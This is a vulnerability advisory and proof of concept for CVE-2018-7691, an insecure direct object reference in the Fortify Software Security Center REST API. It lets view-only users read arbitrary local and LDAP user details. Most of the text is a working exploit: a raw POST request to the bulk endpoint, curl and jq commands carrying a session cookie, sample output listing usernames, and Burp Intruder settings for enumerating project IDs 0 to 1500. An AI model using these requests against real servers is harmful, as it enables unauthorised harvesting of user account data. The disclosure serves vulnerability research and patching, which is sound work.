Software: Fortify SSC (Software Security Center)
Version: 17.10, 17.20 & 18.10
Homepage: https://www.microfocus.com
Advisory report: https://github.com/alt3kx/CVE-2018-7691
CVE: CVE-2018-7691
CVSS: 6.5 (Medium; AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
CWE-639

Description
================
REST API contains Insecure direct object references (IDOR) allowing and extracting arbitrary details of the Local and LDAP users via POST method

Vulnerability
================
Fortify SSC (Software Security Center) 17.10, does not properly check ownership of "authEntities", which allows remote authenticated (view-only) users
to read arbitrary details via API bulk parameter to /api/v1/projectVersions/{NUMBER}/authEntities

Note: View-only Role, is a restricted role, can view results, but cannot interfere with the issue triage or the remediation process.

Proof of concept
================

Pre-requisites:

- Curl command deployed (Windows or Linux)
- jq command deployed (for parsing JSON fields), (Windows or Linux)
- Burpsuite Free/Por deployed or any other Proxy to catch/send the request (optional)

Step (1): LogOn into fortifyserver.com SSC (Software Security Center) 17.10 with your view-only role (restricted),

The URL normally is avaiable as following:

Target: https://fortifyserver.com/ssc/#/

Step (2): Once logged extract the Cookie field, the format normally as following: "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
Step (3): Start BurpSuite Free/Pro or any other HTTP proxy (optional) listen port 8080 as default

Step (4): The offending POST is:

POST /ssc/api/v1/bulk HTTP/1.1
Host: fortifyserver.com
Connection: close
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;
Content-Length: 123

{"requests":[{"uri":"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities","httpVerb":"GET"}]}\x0d\x0a

Step (5): Test the first POST (to be included the cookie session) request and parsing the JSON data received using curl and jq commands as following:

# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "Accept: application/json, text/plain, */*"
-H "X-Requested-With: XMLHttpRequest"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Content-Type: application/json;charset=UTF-8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/0/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .responseCode'

You should see the following response:

200

Step (6): Now extract all local and LDAP users registered into Fortify SSC server:

Payload:  /api/v1/projectVersions/{NUMBER}/authEntities, see the field "--data-binary" below and change the number as following:

# curl -s -k -X POST https://fortifyserver.com/ssc/api/v1/bulk

-H "Host: fortifyserver.com"
-H "Connection: close"
-H "Accept: application/json, text/plain, */*"
-H "X-Requested-With: XMLHttpRequest"
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
-H "Content-Type: application/json;charset=UTF-8"
-H "Accept-Encoding: gzip, deflate"
-H "Accept-Language: en-US,en;q=0.9"
-H "Cookie: JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
-b "JSESSIONID=69B1DBD72FCA8DB57C08B01655A07414;"
--data-binary "{\"requests\":[{\"uri\":\"https://fortifyserver.com/ssc/api/v1/projectVersions/3/authEntities\",\"httpVerb\":\"GET\"}]}\x0d\x0a"
--proxy http://127.0.0.1:8080 | jq '.data[] .responses[] .body .data[] .entityName'

You should see the following response with users available

"admin"
"sca"
"alex"

[../snip]

Step (7): Automate with BurpSuite Pro/Free choose:

Payload Positions: "Intruder Tab -> Positions" highlight as following:

-> /api/v1/projectVersions/§1§/authEntities

Payloads set: "Intruder Tab -> Payloads" with the following data:

-> Payload set: 1

-> Payload type: Numbers

Payload Options [Numbers]:

-> Type: Sequential

-> From: 0

-> To: 1500

-> Step: 1

Then start attack…
Have fun!

Have fun!
